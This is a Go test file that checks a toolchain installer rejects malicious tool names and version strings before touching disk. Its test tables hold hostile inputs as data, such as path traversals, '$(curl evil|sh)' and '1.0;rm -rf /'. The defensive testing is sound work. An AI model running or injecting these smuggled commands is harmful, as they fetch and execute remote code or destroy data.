package toolchain

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestValidateToolRefAcceptsRealPins(t *testing.T) {
	for _, tc := range []struct{ name, version string }{
		{"go", "1.26.5"},
		{"node", "24.16.0"},
		{"pnpm", "11.3.0"},
		{"rust", "1.90.0"},
		{"bun", "1.3.14"},
		{"go", "1.26"},
		{"go", "1.26.5-rc.1"},
		{"go", "1.26.5+build.7"},
		{"golangci-lint", "2.7.0"},
	} {
		if err := ValidateToolRef(tc.name, tc.version); err != nil {
			t.Errorf("ValidateToolRef(%q, %q) rejected a legitimate pin: %v", tc.name, tc.version, err)
		}
	}
}

// A version reaches filepath.Join in Install and the install dir is prepended to
// the PATH of later steps, so a traversal escapes the tool cache and can shadow
// go/kubectl/helm for every later run on the host.
func TestValidateToolRefRejectsPathAndArgvAttacks(t *testing.T) {
	for _, tc := range []struct{ desc, name, version string }{
		{"parent traversal", "go", "../../.."},
		{"traversal to bin", "go", "../../../../home/u/.local/bin"},
		{"absolute path", "go", "/etc"},
		{"embedded separator", "go", "1.26.5/../../evil"},
		{"single dot", "go", "."},
		{"double dot", "go", ".."},
		{"leading dash reads as a flag", "go", "-rf"},
		{"command substitution", "go", "$(curl evil|sh)"},
		{"backtick", "go", "`id`"},
		{"semicolon", "go", "1.0;rm -rf /"},
		{"newline", "go", "1.0\nevil"},
		{"null byte", "go", "1.0\x00"},
		{"empty", "go", ""},
		{"name traversal", "../../etc", "1.0"},
		{"name separator", "go/../evil", "1.0"},
		{"name absolute", "/bin/sh", "1.0"},
	} {
		if err := ValidateToolRef(tc.name, tc.version); err == nil {
			t.Errorf("%s: ValidateToolRef(%q, %q) accepted a dangerous value", tc.desc, tc.name, tc.version)
		}
	}
}

func TestValidateToolRefRejectsOverlongVersion(t *testing.T) {
	if err := ValidateToolRef("go", strings.Repeat("1", maxVersionLen+1)); err == nil {
		t.Error("ValidateToolRef accepted a version over the length cap")
	}
}

// skt resolves partial pins upstream, so the looser gate must still accept them
// while refusing anything that could be read as a flag or a separator.
func TestValidateSktRefAcceptsPartialPinsButRejectsAttacks(t *testing.T) {
	for _, v := range []string{"22", "10.5", "1.26.5", "22.12.0-rc.1", "lts_latest", "1.96.0+wasm32-unknown-unknown"} {
		if err := ValidateSktRef("node", v); err != nil {
			t.Errorf("ValidateSktRef(node, %q) rejected a legitimate partial pin: %v", v, err)
		}
	}
	for _, v := range []string{"-rf", "../evil", "22/../..", "$(id)", "a;b", "a b", "", "/abs"} {
		if err := ValidateSktRef("node", v); err == nil {
			t.Errorf("ValidateSktRef(node, %q) accepted a dangerous value", v)
		}
	}
}

// End-to-end: Install must refuse before it creates anything on disk.
func TestInstallRejectsTraversalBeforeTouchingDisk(t *testing.T) {
	cacheDir := t.TempDir()

	_, err := Install(context.Background(), "go", "../../../../pwned", cacheDir)
	if err == nil {
		t.Fatal("Install accepted a traversal version")
	}
	if !strings.Contains(err.Error(), "invalid version") {
		t.Fatalf("Install error = %v, want it to name the invalid version", err)
	}

	escaped := filepath.Join(filepath.Dir(cacheDir), "pwned")
	if _, serr := os.Stat(escaped); serr == nil {
		t.Fatalf("Install created %q outside the cache dir", escaped)
	}
}
